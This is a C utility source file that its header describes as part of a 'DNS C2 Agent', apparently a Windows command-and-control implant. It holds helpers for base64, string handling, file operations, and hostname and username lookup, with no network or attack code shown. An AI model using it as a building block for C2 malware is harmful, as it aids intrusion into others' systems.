/**
 * Utils.c - Utility functions for DNS C2 Agent
 * 
 * Contains base64 encoding/decoding, string manipulation,
 * and other helper functions needed by the agent.
 */

 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
 #include <time.h>  // Added for time() function
 #include <ctype.h>  // Added for isspace() function
 #include "../include/Utils.h"

// Base64 encoding table
static const char base64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Base64 encode a string
 * 
 * @param data The data to encode
 * @param input_length Length of the data
 * @param output_length Pointer to store the length of encoded data
 * @return Pointer to the encoded string (must be freed by caller)
 */
char* base64_encode(const unsigned char* data, size_t input_length, size_t* output_length) {
    *output_length = 4 * ((input_length + 2) / 3);
    
    char* encoded_data = (char*)malloc(*output_length + 1);
    if (encoded_data == NULL) return NULL;
    
    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;
        
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        
        encoded_data[j++] = base64_table[(triple >> 18) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 12) & 0x3F];
        encoded_data[j++] = base64_table[(triple >> 6) & 0x3F];
        encoded_data[j++] = base64_table[triple & 0x3F];
    }
    
    // Add padding if necessary
    for (size_t i = 0; i < (3 - input_length % 3) % 3; i++) {
        encoded_data[*output_length - 1 - i] = '=';
    }
    
    encoded_data[*output_length] = '\0';
    return encoded_data;
}

/**
 * Helper function to get the base64 index of a character
 */
static int base64_char_value(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1; // Invalid character
}

/**
 * Base64 decode a string
 * 
 * @param data The base64 encoded data
 * @param input_length Length of the encoded data
 * @param output_length Pointer to store the length of decoded data
 * @return Pointer to the decoded data (must be freed by caller)
 */
unsigned char* base64_decode(const char* data, size_t input_length, size_t* output_length) {
    if (input_length % 4 != 0) return NULL;
    
    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*output_length)--;
    if (data[input_length - 2] == '=') (*output_length)--;
    
    unsigned char* decoded_data = (unsigned char*)malloc(*output_length + 1);
    if (decoded_data == NULL) return NULL;
    
    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : base64_char_value(data[i++]);
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : base64_char_value(data[i++]);
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : base64_char_value(data[i++]);
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : base64_char_value(data[i++]);
        
        uint32_t triple = (sextet_a << 18) + (sextet_b << 12) + (sextet_c << 6) + sextet_d;
        
        if (j < *output_length) decoded_data[j++] = (triple >> 16) & 0xFF;
        if (j < *output_length) decoded_data[j++] = (triple >> 8) & 0xFF;
        if (j < *output_length) decoded_data[j++] = triple & 0xFF;
    }
    
    decoded_data[*output_length] = '\0';
    return decoded_data;
}

/**
 * Generate a random UUID string
 * 
 * @return Pointer to UUID string (must be freed by caller)
 */
char* generate_uuid() {
    GUID guid;
    char* uuid = (char*)malloc(37);
    
    if (uuid == NULL) {
        return NULL;
    }
    
    if (CoCreateGuid(&guid) != S_OK) {
        free(uuid);
        return NULL;
    }
    
    sprintf_s(uuid, 37, 
              "%08lX-%04hX-%04hX-%02hhX%02hhX-%02hhX%02hhX%02hhX%02hhX%02hhX%02hhX",
              guid.Data1, guid.Data2, guid.Data3,
              guid.Data4[0], guid.Data4[1], guid.Data4[2], guid.Data4[3],
              guid.Data4[4], guid.Data4[5], guid.Data4[6], guid.Data4[7]);
    
    return uuid;
}

/**
 * Get current timestamp as string
 * 
 * @return Pointer to timestamp string (must be freed by caller)
 */
char* get_timestamp() {
    char* timestamp = (char*)malloc(20);
    if (timestamp == NULL) {
        return NULL;
    }
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    sprintf_s(timestamp, 20, "%04d-%02d-%02d %02d:%02d:%02d", 
              st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    
    return timestamp;
}

/**
 * Split a string by delimiter
 * 
 * @param str String to split
 * @param delim Delimiter character
 * @param count Pointer to store the count of tokens
 * @return Array of strings (must be freed by caller, including each string)
 */
char** str_split(const char* str, char delim, int* count) {
    // Count the number of delimiters
    int num_tokens = 1;
    for (const char* p = str; *p; p++) {
        if (*p == delim) {
            num_tokens++;
        }
    }
    
    // Allocate array of string pointers
    char** tokens = (char**)malloc(num_tokens * sizeof(char*));
    if (tokens == NULL) {
        *count = 0;
        return NULL;
    }
    
    // Copy the string to avoid modifying the original
    char* str_copy = _strdup(str);
    if (str_copy == NULL) {
        free(tokens);
        *count = 0;
        return NULL;
    }
    
    // Split the string
    char* context = NULL;
    char* token = strtok_s(str_copy, &delim, &context);
    int i = 0;
    
    while (token != NULL && i < num_tokens) {
        tokens[i] = _strdup(token);
        token = strtok_s(NULL, &delim, &context);
        i++;
    }
    
    free(str_copy);
    *count = i;
    return tokens;
}

/**
 * Free array of strings
 * 
 * @param tokens Array of strings
 * @param count Number of strings in the array
 */
void free_tokens(char** tokens, int count) {
    if (tokens == NULL) {
        return;
    }
    
    for (int i = 0; i < count; i++) {
        if (tokens[i] != NULL) {
            free(tokens[i]);
        }
    }
    
    free(tokens);
}

/**
 * URL-encode a string
 * 
 * @param str String to encode
 * @return Pointer to encoded string (must be freed by caller)
 */
char* url_encode(const char* str) {
    if (str == NULL) {
        return NULL;
    }
    
    // Allocate memory for the worst case (all characters need encoding)
    size_t len = strlen(str);
    char* encoded = (char*)malloc(len * 3 + 1);
    if (encoded == NULL) {
        return NULL;
    }
    
    char* p = encoded;
    
    for (; *str; str++) {
        if ((*str >= 'A' && *str <= 'Z') ||
            (*str >= 'a' && *str <= 'z') ||
            (*str >= '0' && *str <= '9') ||
            *str == '-' || *str == '_' || *str == '.' || *str == '~') {
            *p++ = *str;
        } else {
            sprintf_s(p, 4, "%%%02X", (unsigned char)*str);
            p += 3;
        }
    }
    
    *p = '\0';
    return encoded;
}

// Replace file_exists function with Unicode version
BOOL file_exists(const char* filename) {
    // Convert to wide characters
    int wlen = MultiByteToWideChar(CP_UTF8, 0, filename, -1, NULL, 0);
    wchar_t* wfilename = (wchar_t*)malloc(wlen * sizeof(wchar_t));
    if (wfilename == NULL) {
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, filename, -1, wfilename, wlen);
    
    DWORD attributes = GetFileAttributesW(wfilename);
    free(wfilename);
    
    return (attributes != INVALID_FILE_ATTRIBUTES && 
            !(attributes & FILE_ATTRIBUTE_DIRECTORY));
}

// Replace directory_exists function with Unicode version
BOOL directory_exists(const char* dirname) {
    // Convert to wide characters
    int wlen = MultiByteToWideChar(CP_UTF8, 0, dirname, -1, NULL, 0);
    wchar_t* wdirname = (wchar_t*)malloc(wlen * sizeof(wchar_t));
    if (wdirname == NULL) {
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, dirname, -1, wdirname, wlen);
    
    DWORD attributes = GetFileAttributesW(wdirname);
    free(wdirname);
    
    return (attributes != INVALID_FILE_ATTRIBUTES && 
            (attributes & FILE_ATTRIBUTE_DIRECTORY));
}

// Replace create_directory function with Unicode version
BOOL create_directory(const char* dirname) {
    // Convert to wide characters
    int wlen = MultiByteToWideChar(CP_UTF8, 0, dirname, -1, NULL, 0);
    wchar_t* wdirname = (wchar_t*)malloc(wlen * sizeof(wchar_t));
    if (wdirname == NULL) {
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, dirname, -1, wdirname, wlen);
    
    BOOL result = CreateDirectoryW(wdirname, NULL);
    free(wdirname);
    
    return result;
}

// Replace get_hostname function with Unicode version
char* get_hostname() {
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    wchar_t* whostname = (wchar_t*)malloc(size * sizeof(wchar_t));
    
    if (whostname == NULL) {
        return NULL;
    }
    
    if (!GetComputerNameW(whostname, &size)) {
        free(whostname);
        return NULL;
    }
    
    // Convert to UTF-8
    int utf8_size = WideCharToMultiByte(CP_UTF8, 0, whostname, -1, NULL, 0, NULL, NULL);
    char* hostname = (char*)malloc(utf8_size);
    
    if (hostname == NULL) {
        free(whostname);
        return NULL;
    }
    
    WideCharToMultiByte(CP_UTF8, 0, whostname, -1, hostname, utf8_size, NULL, NULL);
    free(whostname);
    
    return hostname;
}

// Replace get_username function with Unicode version
char* get_username() {
    DWORD size = 256;
    wchar_t* wusername = (wchar_t*)malloc(size * sizeof(wchar_t));
    
    if (wusername == NULL) {
        return NULL;
    }
    
    if (!GetUserNameW(wusername, &size)) {
        free(wusername);
        return NULL;
    }
    
    // Convert to UTF-8
    int utf8_size = WideCharToMultiByte(CP_UTF8, 0, wusername, -1, NULL, 0, NULL, NULL);
    char* username = (char*)malloc(utf8_size);
    
    if (username == NULL) {
        free(wusername);
        return NULL;
    }
    
    WideCharToMultiByte(CP_UTF8, 0, wusername, -1, username, utf8_size, NULL, NULL);
    free(wusername);
    
    return username;
}

// Replace get_current_directory function with Unicode version
char* get_current_directory() {
    DWORD size = GetCurrentDirectoryW(0, NULL);
    wchar_t* wdir = (wchar_t*)malloc(size * sizeof(wchar_t));
    
    if (wdir == NULL) {
        return NULL;
    }
    
    if (!GetCurrentDirectoryW(size, wdir)) {
        free(wdir);
        return NULL;
    }
    
    // Convert to UTF-8
    int utf8_size = WideCharToMultiByte(CP_UTF8, 0, wdir, -1, NULL, 0, NULL, NULL);
    char* dir = (char*)malloc(utf8_size);
    
    if (dir == NULL) {
        free(wdir);
        return NULL;
    }
    
    WideCharToMultiByte(CP_UTF8, 0, wdir, -1, dir, utf8_size, NULL, NULL);
    free(wdir);
    
    return dir;
}

// Replace copy_file function with Unicode version
BOOL copy_file(const char* source, const char* destination, BOOL overwrite) {
    // Convert source to wide characters
    int wsrc_len = MultiByteToWideChar(CP_UTF8, 0, source, -1, NULL, 0);
    wchar_t* wsource = (wchar_t*)malloc(wsrc_len * sizeof(wchar_t));
    if (wsource == NULL) {
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, source, -1, wsource, wsrc_len);
    
    // Convert destination to wide characters
    int wdst_len = MultiByteToWideChar(CP_UTF8, 0, destination, -1, NULL, 0);
    wchar_t* wdestination = (wchar_t*)malloc(wdst_len * sizeof(wchar_t));
    if (wdestination == NULL) {
        free(wsource);
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, destination, -1, wdestination, wdst_len);
    
    BOOL result = CopyFileW(wsource, wdestination, !overwrite);
    
    free(wsource);
    free(wdestination);
    
    return result;
}

// Replace move_file function with Unicode version
BOOL move_file(const char* source, const char* destination) {
    // Convert source to wide characters
    int wsrc_len = MultiByteToWideChar(CP_UTF8, 0, source, -1, NULL, 0);
    wchar_t* wsource = (wchar_t*)malloc(wsrc_len * sizeof(wchar_t));
    if (wsource == NULL) {
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, source, -1, wsource, wsrc_len);
    
    // Convert destination to wide characters
    int wdst_len = MultiByteToWideChar(CP_UTF8, 0, destination, -1, NULL, 0);
    wchar_t* wdestination = (wchar_t*)malloc(wdst_len * sizeof(wchar_t));
    if (wdestination == NULL) {
        free(wsource);
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, destination, -1, wdestination, wdst_len);
    
    BOOL result = MoveFileW(wsource, wdestination);
    
    free(wsource);
    free(wdestination);
    
    return result;
}

// Replace delete_file function with Unicode version
BOOL delete_file(const char* filename) {
    // Convert to wide characters
    int wlen = MultiByteToWideChar(CP_UTF8, 0, filename, -1, NULL, 0);
    wchar_t* wfilename = (wchar_t*)malloc(wlen * sizeof(wchar_t));
    if (wfilename == NULL) {
        return FALSE;
    }
    MultiByteToWideChar(CP_UTF8, 0, filename, -1, wfilename, wlen);
    
    BOOL result = DeleteFileW(wfilename);
    free(wfilename);
    
    return result;
}

/**
 * Get the size of a file
 * 
 * @param filename Path to the file
 * @return Size of the file in bytes, or -1 on error
 */
long get_file_size(const char* filename) {
    WIN32_FILE_ATTRIBUTE_DATA fad;
    if (!GetFileAttributesExA(filename, GetFileExInfoStandard, &fad)) {
        return -1;
    }
    
    LARGE_INTEGER size;
    size.HighPart = fad.nFileSizeHigh;
    size.LowPart = fad.nFileSizeLow;
    return (long)size.QuadPart;
}

/**
 * Read a file into memory
 * 
 * @param filename Path to the file
 * @param size Pointer to store the size of the file
 * @return Pointer to file contents (must be freed by caller)
 */
unsigned char* read_file(const char* filename, size_t* size) {
    FILE* file;
    unsigned char* buffer;
    
    if (fopen_s(&file, filename, "rb") != 0) {
        return NULL;
    }
    
    fseek(file, 0, SEEK_END);
    *size = ftell(file);
    rewind(file);
    
    buffer = (unsigned char*)malloc(*size + 1);
    if (buffer == NULL) {
        fclose(file);
        return NULL;
    }
    
    size_t read_size = fread(buffer, 1, *size, file);
    fclose(file);
    
    if (read_size != *size) {
        free(buffer);
        return NULL;
    }
    
    buffer[*size] = '\0';
    return buffer;
}

/**
 * Write data to a file
 * 
 * @param filename Path to the file
 * @param data Data to write
 * @param size Size of the data
 * @return TRUE if successful, FALSE otherwise
 */
BOOL write_file(const char* filename, const unsigned char* data, size_t size) {
    FILE* file;
    
    if (fopen_s(&file, filename, "wb") != 0) {
        return FALSE;
    }
    
    size_t written = fwrite(data, 1, size, file);
    fclose(file);
    
    return (written == size);
}

/**
 * Append data to a file
 * 
 * @param filename Path to the file
 * @param data Data to append
 * @param size Size of the data
 * @return TRUE if successful, FALSE otherwise
 */
BOOL append_to_file(const char* filename, const unsigned char* data, size_t size) {
    FILE* file;
    
    if (fopen_s(&file, filename, "ab") != 0) {
        return FALSE;
    }
    
    size_t written = fwrite(data, 1, size, file);
    fclose(file);
    
    return (written == size);
}

/**
 * Sleep for a specified number of milliseconds
 * 
 * @param milliseconds Number of milliseconds to sleep
 */
void sleep_ms(DWORD milliseconds) {
    Sleep(milliseconds);
}

/**
 * Get a random number between min and max (inclusive)
 * 
 * @param min Minimum value
 * @param max Maximum value
 * @return Random number
 */
int get_random_int(int min, int max) {
    static BOOL initialized = FALSE;
    
    if (!initialized) {
        srand((unsigned int)time(NULL));
        initialized = TRUE;
    }
    
    return min + rand() % (max - min + 1);
}

/**
 * Convert string to lowercase
 * 
 * @param str String to convert
 */
void str_tolower(char* str) {
    for (; *str; str++) {
        *str = tolower(*str);
    }
}

/**
 * Convert string to uppercase
 * 
 * @param str String to convert
 */
void str_toupper(char* str) {
    for (; *str; str++) {
        *str = toupper(*str);
    }
}

/**
 * Check if a string starts with a prefix
 * 
 * @param str String to check
 * @param prefix Prefix to check for
 * @return TRUE if string starts with prefix, FALSE otherwise
 */
BOOL str_startswith(const char* str, const char* prefix) {
    size_t prefix_len = strlen(prefix);
    size_t str_len = strlen(str);
    
    if (prefix_len > str_len) {
        return FALSE;
    }
    
    return (strncmp(str, prefix, prefix_len) == 0);
}

/**
 * Check if a string ends with a suffix
 * 
 * @param str String to check
 * @param suffix Suffix to check for
 * @return TRUE if string ends with suffix, FALSE otherwise
 */
BOOL str_endswith(const char* str, const char* suffix) {
    size_t suffix_len = strlen(suffix);
    size_t str_len = strlen(str);
    
    if (suffix_len > str_len) {
        return FALSE;
    }
    
    return (strcmp(str + str_len - suffix_len, suffix) == 0);
}

/**
 * Trim whitespace from the beginning and end of a string
 * 
 * @param str String to trim
 * @return Pointer to trimmed string (must be freed by caller)
 */
char* str_trim(const char* str) {
    if (str == NULL) {
        return NULL;
    }
    
    // Find the first non-whitespace character
    const char* start = str;
    while (*start && isspace(*start)) {
        start++;
    }
    
    // If the string is all whitespace, return an empty string
    if (*start == '\0') {
        char* result = (char*)malloc(1);
        if (result != NULL) {
            result[0] = '\0';
        }
        return result;
    }
    
    // Find the last non-whitespace character
    const char* end = str + strlen(str) - 1;
    while (end > start && isspace(*end)) {
        end--;
    }
    
    // Allocate memory for the trimmed string
    size_t len = end - start + 1;
    char* result = (char*)malloc(len + 1);
    if (result == NULL) {
        return NULL;
    }
    
    // Copy the trimmed string
    strncpy_s(result, len + 1, start, len);
    result[len] = '\0';
    
    return result;
}
